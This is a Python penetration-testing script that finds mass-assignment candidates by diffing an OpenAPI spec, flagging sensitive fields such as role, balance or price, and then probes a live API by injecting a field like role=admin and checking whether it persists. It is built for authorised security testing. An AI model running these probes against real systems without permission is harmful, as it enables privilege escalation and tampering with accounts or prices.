#!/usr/bin/env python3
"""Mass assignment: find fields the server returns but the client is not meant to write, then prove one.

  fields  diff an OpenAPI 2/3 spec: per write operation (POST/PUT/PATCH), the response-schema fields of
          the same resource that its request schema lacks (or that are readOnly). Sensitive names flagged.
  probe   on an object YOU own: GET before, send the write with the extra field, GET after.
          Finding only if the after-GET shows the injected value and the before-GET did not.

  scripts/mythos python3 skills/business-logic/scripts/mass_assign.py fields engagements/<dir>/recon/openapi.json
  scripts/mythos python3 skills/business-logic/scripts/mass_assign.py probe \
    --headers engagements/<dir>/sessions/userA.headers --method PUT --url http://t/api/users/17 \
    --body '{"email":"mythos-a@lab"}' --field role=admin --get-url http://t/api/users/17
"""
import argparse, json, re, sys, urllib.error, urllib.request
from pathlib import Path

SENSITIVE = re.compile(r"role|admin|is_?staff|super|perm|privilege|scope|group|balance|credit|price|amount|"
                       r"discount|total|owner|user_?id|tenant|account_?id|verified|status|approved|plan|tier|"
                       r"limit|quota|password|token|key", re.I)


def deref(spec, node, seen=()):
    while isinstance(node, dict) and "$ref" in node:
        ref = node["$ref"]
        if ref in seen:
            return {}
        seen = seen + (ref,)
        node = spec
        for part in ref.lstrip("#/").split("/"):
            node = node.get(part, {})
    return node


def props(spec, schema, prefix="", seen=(), depth=0):
    """Flatten a schema into {dotted.field: readOnly?}."""
    schema = deref(spec, schema, seen)
    out = {}
    if depth > 6 or not isinstance(schema, dict):
        return out
    for key in ("allOf", "oneOf", "anyOf"):
        for sub in schema.get(key, []):
            out.update(props(spec, sub, prefix, seen, depth + 1))
    if schema.get("type") == "array" or "items" in schema:
        out.update(props(spec, schema.get("items", {}), prefix, seen, depth + 1))
    for name, sub in (schema.get("properties") or {}).items():
        sub_d = deref(spec, sub, seen)
        out[prefix + name] = bool(isinstance(sub_d, dict) and sub_d.get("readOnly"))
        out.update(props(spec, sub, prefix + name + ".", seen, depth + 1))
    return out


def req_schema(op):
    for c in (op.get("requestBody") or {}).get("content", {}).values():
        return c.get("schema", {})
    for p in op.get("parameters", []):
        if p.get("in") == "body":
            return p.get("schema", {})
    return {}


def resp_schemas(op):
    for code, r in (op.get("responses") or {}).items():
        if str(code).startswith("2"):
            yield r.get("schema", {})
            for c in (r.get("content") or {}).values():
                yield c.get("schema", {})


def resource(path):
    """/api/users/{id} and /api/users share a resource key."""
    return re.sub(r"/\{[^}]+\}$", "", path.rstrip("/"))


def fields(spec_path):
    spec = json.loads(Path(spec_path).read_text())
    paths = spec.get("paths", {})
    returned = {}
    for path, item in paths.items():
        for m, op in item.items():
            if isinstance(op, dict):
                for s in resp_schemas(op):
                    returned.setdefault(resource(path), {}).update(props(spec, s))
    rows = []
    for path, item in paths.items():
        for m, op in item.items():
            if m.lower() not in ("post", "put", "patch") or not isinstance(op, dict):
                continue
            req = props(spec, req_schema(op))
            ret = returned.get(resource(path), {})
            extra = sorted(f for f in ret if f not in req or req.get(f))
            ro = sorted(f for f, r in req.items() if r)
            cand = sorted(set(extra + ro), key=lambda f: (not SENSITIVE.search(f), f))
            if cand:
                rows.append({"op": f"{m.upper()} {path}", "writable": sorted(req),
                             "try": cand, "sensitive": [f for f in cand if SENSITIVE.search(f)]})
    for r in rows:
        print(json.dumps(r))
    return 0


def http(method, url, headers, body=None):
    h = dict(headers)
    if body is not None:
        h["Content-Type"] = "application/json"
    req = urllib.request.Request(url, json.dumps(body).encode() if body is not None else None, h, method=method)
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            return r.status, r.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")


def lookup(text, dotted):
    try:
        o = json.loads(text)
        for part in dotted.split("."):
            o = o[int(part)] if isinstance(o, list) else o[part]
        return o
    except (ValueError, KeyError, IndexError, TypeError):
        return None


def probe(a):
    headers = dict(l.split(": ", 1) for l in Path(a.headers).read_text().splitlines() if ": " in l)
    name, _, raw = a.field.partition("=")
    try:
        value = json.loads(raw)
    except ValueError:
        value = raw
    body = json.loads(a.body or "{}")
    cur = body
    *parents, leaf = name.split(".")
    for p in parents:
        cur = cur.setdefault(p, {})
    cur[leaf] = value
    path = a.read_path or name
    s0, before = http("GET", a.get_url, headers)
    s1, write = http(a.method, a.url, headers, body)
    s2, after = http("GET", a.get_url, headers)
    v0, v2 = lookup(before, path), lookup(after, path)
    persisted = v2 == value and v0 != value
    print(json.dumps({"field": name, "injected": value, "before": {"status": s0, "value": v0},
                      "write": {"status": s1, "excerpt": write[:300]}, "after": {"status": s2, "value": v2},
                      "verdict": "reproduced" if persisted else ("no-change" if v2 == v0 else "review")}))
    return 0


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    sub = ap.add_subparsers(dest="cmd", required=True)
    f = sub.add_parser("fields"); f.add_argument("spec")
    p = sub.add_parser("probe")
    p.add_argument("--headers", required=True)
    p.add_argument("--method", default="PATCH")
    p.add_argument("--url", required=True)
    p.add_argument("--body", help="normal JSON body of the write, the field is merged in")
    p.add_argument("--field", required=True, help="dotted.name=value (value parsed as JSON if possible)")
    p.add_argument("--get-url", required=True, help="authoritative read of the same object")
    p.add_argument("--read-path", help="dotted path of the field in the GET response, if it differs")
    a = ap.parse_args()
    return fields(a.spec) if a.cmd == "fields" else probe(a)


if __name__ == "__main__":
    sys.exit(main())
